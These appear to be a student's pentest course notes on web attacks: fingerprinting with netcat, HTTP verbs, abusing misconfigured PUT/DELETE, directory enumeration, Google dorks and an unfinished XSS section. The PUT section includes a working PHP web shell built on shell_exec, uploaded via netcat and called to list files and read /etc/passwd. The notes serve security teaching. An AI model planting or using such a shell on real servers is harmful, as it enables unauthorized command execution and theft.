Penetration Testing 4 - Web Application Attacks

Web Server Fingerprinting
	Detecting: 
		Daemon providing the service (E.g. IIS, Apache, nginx)
		Version
		OS of the host
	
	Netcat (TCP/IP Swiss army knife)
		Can act as client or server
		Banner Grabbing (Non-SSL)
			nc <Target Address> 80
			HEAD / HTTP/1.0
			
		Notes: 
			Request in Uppercase
			Connects silently. Just need to write command (-v for verbose)
		
			openssl s_client -connect target.site:443
			HEAD / HTTP/1.0
			
			
	HTTPrint
		httprint -P0 -h <target hosts> -s <signatue file>
			-P0 = Don't ping
			-h = list of hosts
			-s = signature file to use
			
		E.g.
			httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt
			
HTTP VERBS
	GET
		Request a resource
			GET /page.php HTTP/1.1
			Host: www.example.site
			
			GET /page.php?course=PTS HTTP/1.1
			Host: www.exaple.site			
	POST
		Submit HTML form POST Parameters in message body
			POST /login.php HTTP/1.1
			Host: www.example.site
			
			username=john&password=mypass

	HEAD
		Similar to GET and is asks for just the headders of the response. 
			HEAD / HTTP/1.1
			Host: www.example.site
			
	PUT
		Upload a file to a server. Dangerous if misconfigured. 
			PUT /path/to/destination HTTP/1.1
			Host: www.example.site
			
			<PUT data>
			
	DELETE
		Delete a file from a server
			DELETE /path/to/destination HTTP/1.1
			Host: www.example.site
		
	OPTIONS
		Query the server for enabled HTTP Verbs (If using HTTP/1.0 can skip the Host)
			OPTIONS / HTTP/1.1
			Host: www.example.site


Exploiting Misconfigured Verbs
	Becomnig uncommon
		Common in embedded devices, IP Cameras, and smart devices. 
		
	Send OPTIONS message
		nc victim.site 80
		OPTIONS / HTTP/1.0
		
	Exploiting DELETE
		nc victim.site 80
		DELETE /path/to/resource.txt HTTP/1.0
		
	Exploiting PUT
		Need size of the file
			wc -m payload.php
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 20
		<?php phpinfo(); ?>
		
		Uploading a PHP Shell with PUT
		
		wc -m shell.php
			136 shell.php
		
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 136
		<?php
		if (isset($_GET['cmd']))
		{
			$cmd = $_GET['cmd'];
			echo '<pre>';
			$result = shell_exec($cmd);
			echo $result;
			echo '</pre>';
		}
		?>
		
		Called by browsing like the below to execute the ls command: 
			victim.site/shell.php?cmd=ls
		Or
			victim.site/shell.php?cmd=cat /etc/passed
			
			
	Misconfigured verbs rare in web servers. Better setup by default. 
	Common in smart devices, IP cameras. etc. 
	

	Directories and file enumeration. 
	Folders not always linked to. But can be found if they are known. 
	Enumeration helps fild the 'hidden' resources. 
		Backup and untested features
		Bbackup files
		Testing information
		DEvelopers notes. 
	Accessing can give unintended information about the system. 
		Ip Addresses of backend systems etc. 
	Enumeration by: 
		Pure brute force - inefficant 
			Need 287979 trials to get to the word "home"
		Dictionary attacks. 
			Use common names and extentions. 
				E.g. .bak, .old, .txt, .xxx.
			Takes aprox. 2,000 requests of an entire website. 
			Enumerating a single resource like /score takes more than 8k requests. 
			
	Tool: OWASP Dirbuster
		

Google Hacking. Aka Google Dorks
	site:
		Only for specific site
	intitle: 
		Filters acording to title of page
	inrul: 
		Filters acording to url
	filetype:
		filters to filetype. E.g. .pdf or .xls
	AND, OR, &, |
		Combine expression. site:example.com OR site.another.com
	-
		Filter out a keyword
		
	E.g. 
		-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
		Excludes common webpage expressions and looking for open directory indexes containint txt, doc or pdf
		

Cross Site Scripting (XSS)
	Vulnerabilty lets an atatcker control some of the content of a web application
	- Modify the content of a site at run-time
	- Inject Malicious contents
	- Steal cookies and thus session of a users. 
	- Perform actions on web applications as if a legittimate user
	- And much more!!!
	
	Actors Involved
		Vulnerable Application
			XSS happens when a web application uses unfiltererd user input to build the output displayed. 
			Lets attacker control the output HTML and JavaScript code
			user input is any parameter coming from the client side. 
				E.g. Request Headers, Cookies, Form Inputs, POST Parameters, GET Parameters. 
				
		Victim User (Visitor)
		The Penetration Tester
		
	
		
				
		
		